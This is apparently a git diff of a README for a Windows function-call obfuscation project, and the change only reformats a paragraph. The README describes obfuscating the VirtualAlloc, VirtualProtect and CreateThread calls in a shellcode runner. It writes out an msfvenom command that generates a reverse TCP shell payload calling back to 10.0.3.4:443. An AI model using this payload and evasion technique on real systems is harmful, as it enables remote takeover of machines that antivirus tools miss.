@@ -1,7 +1,9 @@
 # Function Call Obfuscation
 
 ## Details
-This was inspired by `https://jamespatricksec.medium.com/function-call-obfuscation-51f6bb171767` and `https://medium.com/@irfanbhat3/function-call-obfuscation-1bcd58e62b8e` where it is discussed and shown how to *obfuscate function calls* for **Windows binaries**. The `Original.cpp` contains the original function calls before any obfuscation.
+This was inspired by `https://jamespatricksec.medium.com/function-call-obfuscation-51f6bb171767` and `https://medium.com/@irfanbhat3/function-call-obfuscation-1bcd58e62b8e` where it is discussed and shown how to *obfuscate function calls* for **Windows binaries**.
+
+The `Original.cpp` contains the original function calls before any obfuscation.
 
 The `SC_Rev.cpp` obfuscates `VirtualProtect`, `VirtualAlloc`, `CreateThread` `WaitForSingleObject`. Both use the **standard msfvenom** shellcode with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f c -v shellcode_payload` for testing purposes.
 
